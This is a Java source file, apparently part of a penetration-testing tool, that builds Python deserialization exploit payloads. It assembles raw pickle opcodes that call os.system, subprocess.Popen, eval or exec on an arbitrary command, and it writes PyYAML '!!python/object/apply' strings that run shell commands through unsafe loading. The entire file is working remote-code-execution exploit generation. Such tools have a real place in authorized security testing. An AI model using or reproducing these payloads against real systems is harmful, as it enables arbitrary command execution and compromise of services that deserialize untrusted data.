package com.omnistrike.modules.injection.deser;

import java.nio.charset.StandardCharsets;
import java.util.*;

/**
 * Python deserialization payload generators.
 *
 * Constructs pickle opcodes as byte arrays.
 * Also generates PyYAML unsafe_load exploit strings.
 */
public final class PythonPayloads {

    private PythonPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> chains = new LinkedHashMap<>();
        chains.put("PickleOsSystem", "pickle __reduce__ → os.system(cmd)");
        chains.put("PickleSubprocess", "pickle __reduce__ → subprocess.Popen(cmd)");
        chains.put("PickleEval", "pickle __reduce__ → eval(code)");
        chains.put("PickleExec", "pickle __reduce__ → exec(code) via builtins");
        chains.put("PyYAMLExploit", "PyYAML !!python/object/apply:os.system exploit");
        chains.put("PyYAMLSubprocess", "PyYAML !!python/object/apply:subprocess.check_output");
        return chains;
    }

    public static byte[] generate(String chain, String command) {
        return switch (chain) {
            case "PickleOsSystem"    -> generatePickleOsSystem(command);
            case "PickleSubprocess"  -> generatePickleSubprocess(command);
            case "PickleEval"        -> generatePickleEval(command);
            case "PickleExec"        -> generatePickleExec(command);
            case "PyYAMLExploit"     -> generatePyYamlOsSystem(command);
            case "PyYAMLSubprocess"  -> generatePyYamlSubprocess(command);
            default -> throw new IllegalArgumentException("Unknown Python chain: " + chain);
        };
    }

    private static byte[] generatePickleOsSystem(String command) {
        String pickle = "cos\nsystem\n(S'" + escapePickleString(command) + "'\ntR.";
        return pickle.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generatePickleSubprocess(String command) {
        String pickle = "csubprocess\nPopen\n((S'" + escapePickleString(command) + "'\n" +
                "I01\ndS'shell'\nI01\ntR.";
        return pickle.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generatePickleEval(String command) {
        String code = "__import__('os').system('" + escapePickleString(command) + "')";
        String pickle = "cbuiltins\neval\n(S'" + escapePickleString(code) + "'\ntR.";
        return pickle.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generatePickleExec(String command) {
        String code = "import os; os.system('" + escapePickleString(command) + "')";
        String pickle = "cbuiltins\nexec\n(S'" + escapePickleString(code) + "'\ntR.";
        return pickle.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generatePyYamlOsSystem(String command) {
        String yaml = "!!python/object/apply:os.system\n- " + escapeYaml(command);
        return yaml.getBytes(StandardCharsets.UTF_8);
    }

    private static byte[] generatePyYamlSubprocess(String command) {
        String yaml = "!!python/object/apply:subprocess.check_output\n" +
                "- !!python/tuple\n" +
                "  - " + escapeYaml(command) + "\n" +
                "- {shell: true}";
        return yaml.getBytes(StandardCharsets.UTF_8);
    }

    private static String escapePickleString(String s) {
        return s.replace("\\", "\\\\").replace("'", "\\'").replace("\n", "\\n");
    }

    private static String escapeYaml(String s) {
        if (s.contains("'") || s.contains("\"") || s.contains(":") || s.contains("#")) {
            return "'" + s.replace("'", "''") + "'";
        }
        return s;
    }
}
